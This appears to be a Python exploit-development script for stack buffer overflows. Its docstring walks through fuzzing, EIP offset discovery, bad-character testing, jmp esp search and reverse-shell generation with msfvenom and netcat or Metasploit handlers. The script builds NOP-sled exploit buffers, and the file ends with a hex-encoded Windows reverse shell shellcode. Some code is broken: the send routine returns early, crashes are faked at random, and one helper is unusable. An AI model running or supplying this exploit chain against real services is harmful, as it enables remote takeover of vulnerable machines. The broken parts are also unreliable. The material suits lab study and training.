#!/usr/bin/env python3

## check  https://github.com/evets007/BOF-SemiAutomatic and update as necessary

import re
import sys
import random
import socket
import argparse
import binascii
from string import digits, ascii_uppercase, ascii_lowercase


"""
  a. fuzz and find buffer overflow size:
    python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode fuzz
    python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode offset --bufsize 3000 --eipvalue pD5p

    !mona pc <bufsize>
    !mona findmsp

  b. fuzz and find all badchars (\x00-\xff):
    !mona config -set workingfolder \\preferred\\path\\%p

    !mona bytearray -cpb \x00 # creates bytearray.txt and bytearray.bin files
    python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode badchars --bufsize 3000 # fuzz badchars

    !mona compare -a esp -f \\path\\to\\bytearray.bin # shows badchar, eg: \x00
    python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode badchars --bufsize 3000 --badchars "\x00" # fuzz with \x00 removed

    !mona compare -a esp -f \\path\\to\\bytearray.bin # shows badchar, eg: \x0a
    python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode badchars --bufsize 3000 --badchars "\x00\x0a" # fuzz with \x00\x0a removed
    !mona compare -a esp -f \\path\\to\\bytearray.bin # shows badchar, eg: \x0d

    python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode badchars --bufsize 3000 --badchars "\x00\x0a\x0d" # fuzz with \x00\x0a\x0d removed

  c. find 'jmp esp' address (avoid badchars), preferably within application linked dll:
    !mona jmp -r esp -cpb "\x00\x0a\x0d" -cm os=false # search jmp esp gadget within application linked dlls
    !mona jmp -r esp -cpb "\x00\x0a\x0d" -cm os=true # search jmp esp gadget within application linked dlls and os specific dlls

  d. create reverse shell shellcode (prefer stageless shellcode if bufsize is large enough):
    stageless: msfvenom -p windows/shell_reverse_tcp LHOST=<attackerip> LPORT=<attackerport> -b "\x00\x0a\x0d" -f python EXITFUNC=thread -a x86 --platform Windows
    staged: msfvenom -p windows/shell/reverse_tcp LHOST=<attackerip> LPORT=<attackerport> -b "\x00\x0a\x0d" -f python EXITFUNC=thread -a x86 --platform Windows

  e. run a handler to catch incoming connection from target host:
    netcat (stageless shellcode):
      nc -nlvp <attackerport>
    msf multi/handler (staged shellcode):
      echo -e "\nuse exploit/multi/handler\nset PAYLOAD windows/shell/reverse_tcp\nset LHOST <attackerip>\nset LPORT <attackerport>\nset ExitOnSession false\nshow options\nexploit -j -z" >handler.rc
      msfconsole -r handler.rc

  f. send specially crafted exploit payload:
    python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode exploit --bufsize 3000 --offset 2805 --jmpesp "\xca\xfe\xca\xfe" --shellcode "dbddd97424f4ba2a..."

"""


class BUOF:
  def __init__(self, rhost, rport, lhost, lport):
    self.rhost = rhost
    self.rport = rport
    self.lhost = lhost
    self.lport = lport

  def tobin(self, data):
    #data = data.strip()
    if data.startswith("\\x"):
      return list(binascii.unhexlify(data.replace("\\x", "")))
    else:
      try:
        return binascii.unhexlify(data)
      except:
        return list(map(ord, data))

  def hexdump(self, src, length=16, sep='.'):
    # https://gist.github.com/7h3rAm/5603718
    FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or sep for x in range(256)])
    lines = []
    for c in range(0, len(src), length):
      chars = src[c:c+length]
      hexstr = ' '.join(["%02x" % ord(x) for x in chars]) if type(chars) is str else ' '.join(['{:02x}'.format(x) for x in chars])
      if len(hexstr) > 24:
        hexstr = "%s %s" % (hexstr[:24], hexstr[24:])
      printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or sep) for x in chars]) if type(chars) is str else ''.join(['{}'.format((x <= 127 and FILTER[x]) or sep) for x in chars])
      lines.append("%08x:  %-*s  |%s|" % (c, length*3, hexstr, printable))
    return '\n'.join(lines)

  def sendrecv(self, buf):
    print(self.hexdump(buf))
    return
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((self.rhost, self.rport))
    s.send(buf)
    s.recv(1024)
    s.close()

  def pcreate(self, bufsize):
    ## /usr/bin/msf-pattern_create -l
    pattern = ""
    for alphaupper in ascii_uppercase:
      for alphalower in ascii_lowercase:
        for digit in digits:
          pattern = "%s%s%s%s" % (pattern, alphalower, alphaupper, digit)
          if len(pattern) >= bufsize:
            break
    return pattern[:bufsize]

  def poffset(self, pattern):
    ## /usr/bin/msf-pattern_offset -q
    pattern = pattern.strip()
    if pattern.startswith("0x"):
      value = struct.pack("<I", int(pattern, 16)).strip("\x00")
      print(pattern, value)
    self._pcreate(10)

  def opcode_fuzz(self, bufsize):
    ## python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode fuzz
    bufsize = 10 if not bufsize else bufsize
    while True:
      fuzbuf = self.pcreate(bufsize)
      print("[+] sending fuzbuf with pattern data of size %dB" % (bufsize))
      try:
        self.sendrecv(fuzbuf)
        print()
        if random.randint(0,5) == 3:
          raise Exception("crash!")
      except:
        print("[+] possible crash @ fuzbuf size %dB" % (bufsize))
        print("[+] rerun with '--opcode offset --eipvalue <eipvalue>' arguments to find EIP offset")
        break
      bufsize += 10

  def opcode_offset(self, bufsize, eipvalue):
    ## python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode offset --bufsize 3000 --eipvalue pD5p
    if not eipvalue:
      print("[-] need eipvalue to find offset within fuzbuf")
      return
    bufsize = 10 if not bufsize else bufsize
    maxbufsize = 10000
    while True:
      fuzbuf = self.pcreate(bufsize)
      try:
        print("[+] found eipvalue '%s' @ offset %dB within fuzbuf of size %dB" % (eipvalue, fuzbuf.index(eipvalue), bufsize))
        print("[+] rerun with '--opcode badchars --bufsize <bufsize> --badchars <\\x00\\x0a\\x0d>'")
        break
      except:
        bufsize += 10
        if bufsize >= maxbufsize:
          print("[-] eipvalue '%s' not found within fuzbuf of max size %dB" % (eipvalue, bufsize))
          break
        else:
          continue

  def opcode_badchars(self, bufsize, badchars):
    ## python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode badchars --bufsize 3000 --badchars "\x00\x0a\x0d"
    if not bufsize:
      print("[-] need bufsize to find badchars")
      return
    print("[+] generating buf of size %dB without badchars `%s`" % (bufsize, badchars))
    ascii = list(map(ord, "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"))
    badchars = self.tobin(badchars) if badchars else []
    stripped = [x for x in ascii if x not in badchars]
    buf = []
    nops = self.tobin("\x90"*32)
    buf.extend(nops)
    buf.extend(stripped)
    buf.extend(self.tobin("\x90"*(bufsize-len(buf))))
    self.sendrecv(buf)

  def opcode_exploit(self, bufsize, offset, jmpesp, shellcode, header="", trailer=""):
    ## python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode exploit --bufsize 3000 --offset 2805 --jmpesp "\xca\xfe\xca\xfe"
    ## python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode exploit --bufsize 3000 --offset 2805 --jmpesp "\xca\xfe\xca\xfe" --header "GET " --trailer "\x0a\x0d"
    if not bufsize or not offset or not jmpesp:
      print("[+] need bufsize, offset and jmpesp to exploit")
      return
    header = self.tobin(header)
    nopindexer = self.tobin("\x90"*(offset-len(header)))
    jmpesp = self.tobin(jmpesp)
    nopspacer = self.tobin("\x90"*16)
    shellcode = self.tobin(shellcode)
    trailer = self.tobin(trailer)

    ## expbuf = header + nopindexer + jmpsesp + nopspacer + shellcode + noppadding + trailer
    expbuf = []
    expbuf += header
    expbuf += nopindexer
    expbuf += jmpesp
    expbuf += nopspacer
    expbuf += shellcode
    noppadding = list(map(ord, "\x90"*(bufsize-len(expbuf)-len(trailer))))
    expbuf += noppadding
    expbuf += trailer

    print("[+] sending exploit buf of size %dB stuctured as: header (%dB) + nopindexer (%dB) + jmpsesp (%dB) + nopspacer (%dB) + shellcode (%dB) + noppadding (%dB) + trailer (%dB)" % (
      len(expbuf),
      len(header),
      len(nopindexer),
      len(jmpesp),
      len(nopspacer),
      len(shellcode),
      len(noppadding),
      len(trailer),
    ))
    self.sendrecv(expbuf)

def main(args):
  buof = BUOF(rhost=args.rhost, rport=args.rport, lhost=args.lhost, lport=args.lport)

  # bufsize is optional here, will fuzz till crash if not provided, else will start fuzz from bufsize
  # will give us actual bufsize (in multiples of 10) and eipvalue (from debugger exception)
  if args.opcode == "fuzz":
    buof.opcode_fuzz(bufsize=args.bufsize)

  # bufsize is optional here, will fuzz found or maxbufsize (10000)
  # will give us eip offset within fuzbuf
  elif args.opcode == "offset":
    buof.opcode_offset(bufsize=args.bufsize, eipvalue=args.eipvalue)

  # bufsize is required here
  # badchars is optional, will strip those from fuzbuf, if provided
  elif args.opcode == "badchars":
    buof.opcode_badchars(bufsize=args.bufsize, badchars=args.badchars)

  # bufsize, offset, jmpesp and shellcode are required here
  # header and trailer are optional
  elif args.opcode == "exploit":
    buof.opcode_exploit(bufsize=args.bufsize, offset=args.offset, jmpesp=args.jmpesp, shellcode=args.shellcode, header=args.header, trailer=args.trailer)


if __name__ == "__main__":
  parser = argparse.ArgumentParser(description="bof (v0.1)")

  # mandatory args
  parser.add_argument('--rhost', required=True, action='store')
  parser.add_argument('--rport', required=True, action='store')
  parser.add_argument('--lhost', required=True, action='store')
  parser.add_argument('--lport', required=True, action='store')
  parser.add_argument('--opcode', required=True, action='store', help="fuzz, offset, badchars, exploit")

  # optional args
  parser.add_argument('--bufsize', required=False, default=0, type=int, action='store')
  parser.add_argument('--eipvalue', required=False, default=None, action='store')
  parser.add_argument('--offset', required=False, default=0, type=int, action='store')
  parser.add_argument('--badchars', required=False, default=None, action='store')
  parser.add_argument('--jmpesp', required=False, default=None, action='store')
  parser.add_argument('--shellcode', required=False, default=None, action='store')
  parser.add_argument('--header', required=False, default="", action='store')
  parser.add_argument('--trailer', required=False, default="", action='store')

  main(parser.parse_args())

  ## usage/workflow:
  ## python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode fuzz
  ## python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode offset --bufsize 300 --eipvalue 2cA3
  ## python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode badchars --bufsize 300 --badchars "\x00\x0a\x0d"
  ## msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=7331 -b "\x00\x0a\x0d" EXITFUNC=thread -a x86 --platform Windows -f hex
  ## python3 buof.py --rhost 127.0.0.1 --rport 1337 --lhost 127.0.0.1 --lport 7331 --opcode exploit --bufsize 1000 --offset 200 --jmpesp "cafecafe" --header "GET " --trailer "0a0d" --shellcode "bfa4c1d25ddbd4d97424f45d33c9b152317d1283c50403d9cf30a8dd3836531db957ddf88857b989bb67c9df37039fcbcc6108fc65cf6e33757c5252f57f87b4c44fdab501ad17e7dab98a176ef7169c3c191f41f4180ed48e4290d743ff99cf803a536472b062ac4a39c89162c810d64533672eb6ce70f5c414f4ed6fdeaec98e33289a9df83ec481ff937fbd7412af37ce316b1394582af97b642ca224c0274f30796a18f5b094d891c3e7ea3e786f47b6a668a8ed1fe6570e602f9c5a304735e3db97ba364bc714e92cb7d459c5ddda86f5de30af9c25d3af602522386325381beac32a4bbb5cc3f2e61672fa3c53b470b3a47b71beb6ec71f5e4bb8e2380201ca8502e3d670767f37ecd95aa28f3672a12b7b38f9d3631abb9288f34861c5f6350ca19dd12a4f3b2fc2085f83e368ad4c8d63b818ce9f4451992e8f5e649a916055bc4be900e65a322e5aadaa00f5319b87a56657e972af6eb9799f739"
